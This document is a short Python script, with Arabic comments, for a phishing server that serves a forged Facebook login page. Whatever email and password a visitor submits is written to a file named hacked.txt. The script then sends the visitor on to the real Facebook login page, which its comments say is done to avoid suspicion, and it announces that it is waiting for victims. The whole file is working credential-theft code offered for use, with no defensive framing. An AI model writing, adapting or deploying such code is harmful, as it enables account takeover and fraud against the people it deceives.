from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # عرض صفحة الفيسبوك المزورة
        try:
            with open("index.html", "rb") as f:
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_error(404, "File index.html not found! Make sure it is in the same folder.")

    def do_POST(self):
        # استقبال البيانات من الفورم المطور
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)

        # استخراج البيانات
        email = params.get('email', [''])[0]
        password = params.get('pass', [''])[0]

        # حفظ البيانات فوراً في ملف hacked.txt
        if email or password:
            with open("hacked.txt", "a") as f:
                f.write(f"User: {email} | Pass: {password}\n")
                f.flush()
            print(f"[!] Success! Captured: {email}")

        # التمويه: توجيه الضحية لفيسبوك الحقيقي لابعاد الشكوك
        self.send_response(302)
        self.send_header('Location', 'https://www.facebook.com/login/')
        self.end_headers()

if __name__ == "__main__":
    port = 8080
    print(f"[+] Server started at http://localhost:{port}")
    print("[+] Waiting for victims...")
    try:
        server = HTTPServer(('0.0.0.0', port), MyHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped.")

